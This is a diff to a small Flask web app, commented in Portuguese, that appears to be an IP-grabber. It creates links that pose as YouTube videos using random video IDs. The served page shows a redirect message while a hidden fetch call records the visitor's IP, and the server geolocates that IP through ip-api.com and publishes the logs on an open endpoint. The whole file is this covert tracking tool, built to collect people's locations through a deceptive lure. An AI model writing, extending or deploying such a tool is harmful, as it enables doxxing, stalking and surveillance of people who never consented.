@@ -1,62 +1,75 @@
-from flask import Flask, render_template, jsonify, request, redirect
-import json
-import requests
-import random
-import string
+from flask import Flask, request, render_template, jsonify, redirect
 import os
-from datetime import datetime
+import json
+import uuid
+import datetime
+import requests
 
 app = Flask(__name__)
 
 LOG_FILE = 'logs.json'
+GENERATED_FOLDER = os.path.join('templates', 'generated')
+if not os.path.exists(GENERATED_FOLDER):
+    os.makedirs(GENERATED_FOLDER)
 
-# Função para gerar o link do YouTube (simulando um vídeo aleatório)
-def gerar_link_video():
-    video_id = ''.join(random.choices(string.ascii_letters + string.digits, k=11))
-    return f"https://www.youtube.com/watch?v={video_id}"
-
-# Página principal
 @app.route('/')
 def index():
-    return render_template('index.html')
+    logs = []
+    if os.path.exists(LOG_FILE):
+        with open(LOG_FILE, 'r') as f:
+            logs = json.load(f)
+    return render_template('index.html', logs=logs)
 
-# Geração de link com rastreamento
 @app.route('/gerar_link', methods=['POST'])
 def gerar_link():
-    video_url = gerar_link_video()
-    link_id = ''.join(random.choices(string.digits, k=18))
-    return jsonify({'link': f'{request.host_url}r/{link_id}?v={video_url}'})
+    video_id = uuid.uuid4().hex[:11]
+    youtube_url = f"https://www.youtube.com/watch?v={video_id}"
+    tracking_id = uuid.uuid4().hex
 
-# Rota acessada pelo link gerado
-@app.route('/r/<link_id>')
-def rastrear(link_id):
-    video_url = request.args.get('v')
+    # HTML gerado com redirecionamento
+    html_content = f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta http-equiv="refresh" content="2;url={youtube_url}" />
+        <script>
+            fetch("/track/{tracking_id}")
+        </script>
+    </head>
+    <body>
+        <h1>Redirecionando para o vídeo...</h1>
+    </body>
+    </html>
+    """
+
+    path = os.path.join(GENERATED_FOLDER, f"{tracking_id}.html")
+    with open(path, 'w') as f:
+        f.write(html_content)
+
+    full_link = request.host_url + f"generated/{tracking_id}"
+    return jsonify({"link": full_link})
+
+@app.route('/generated/<tracking_id>')
+def serve_generated(tracking_id):
+    return render_template(f"generated/{tracking_id}.html")
+
+@app.route('/track/<tracking_id>')
+def track(tracking_id):
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    # Debug: Verificar se o IP está sendo capturado corretamente
-    print(f"IP Capturado: {ip}")
-
     try:
-        resposta = requests.get(f"http://ip-api.com/json/{ip}")
-        local = resposta.json()
-        cidade = local.get('city', 'Cidade Desconhecida')
-        regiao = local.get('regionName', 'Região Desconhecida')
-    except Exception as e:
-        print(f"Erro ao buscar localização: {e}")
-        cidade = 'Cidade Desconhecida'
-        regiao = 'Região Desconhecida'
-
-    # Debug: Verificar as variáveis de localização
-    print(f"Localização: {cidade}, {regiao}")
+        location_data = requests.get(f"http://ip-api.com/json/{ip}").json()
+        location = f"{location_data.get('city')}, {location_data.get('regionName')} - {location_data.get('country')}"
+    except Exception:
+        location = "Desconhecida"
 
     log = {
-        "data": str(datetime.now()),
+        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         "ip": ip,
-        "localizacao": f"{cidade}, {regiao}",
-        "id": link_id
+        "location": location,
+        "id": tracking_id
     }
 
-    # Salva no arquivo logs.json
     if os.path.exists(LOG_FILE):
         with open(LOG_FILE, 'r') as f:
             dados = json.load(f)
@@ -68,10 +81,8 @@ def rastrear(link_id):
     with open(LOG_FILE, 'w') as f:
         json.dump(dados, f, indent=4)
 
-    # Redireciona para o link do vídeo
-    return redirect(video_url)
+    return '', 204
 
-# API para retornar os logs
 @app.route('/get_logs')
 def get_logs():
     if os.path.exists(LOG_FILE):
@@ -82,5 +93,6 @@ def get_logs():
     return jsonify(dados)
 
 if __name__ == '__main__':
+    import os
     port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port, debug=True)
+    app.run(host='0.0.0.0', port=port)
